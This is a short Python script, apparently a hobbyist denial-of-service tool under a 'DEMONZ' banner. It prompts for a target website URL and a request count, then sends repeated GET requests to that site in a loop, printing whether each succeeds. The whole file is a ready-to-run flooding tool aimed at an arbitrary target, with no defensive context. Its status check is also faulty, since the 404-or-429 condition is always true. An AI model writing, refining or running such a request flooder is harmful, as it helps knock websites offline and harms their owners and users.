import requests
from pystyle import Colorate, Colors, Center
from colorama import Fore

def main():
    banner = """
    
██████╗ ███████╗███╗   ███╗ ██████╗ ███╗   ██╗███████╗
██╔══██╗██╔════╝████╗ ████║██╔═══██╗████╗  ██║╚══███╔╝
██║  ██║█████╗  ██╔████╔██║██║   ██║██╔██╗ ██║  ███╔╝ 
██║  ██║██╔══╝  ██║╚██╔╝██║██║   ██║██║╚██╗██║ ███╔╝  
██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝██║ ╚████║███████╗
╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚══════╝

              { [+] Creator Qhul }
                                                      
    """

    print(Colorate.Vertical(Colors.purple_to_blue, Center.XCenter(banner)))

    target = input(f"{Fore.RED}[+] Enter Target Site URL:")
    amount = int(input(f"{Fore.MAGENTA}[+] Enter Amount Of Requests: "))


    for _ in range(amount):
        response = requests.get(url=target)

        if response.status_code == 200:
            print(f"{Fore.BLUE}Requests Sent.")

        elif response.status_code == 404 or 429:
            print("Requests Failed")
            continue
        else:
            exit(0)

main()

print(f"{Fore.GREEN} Finished.")
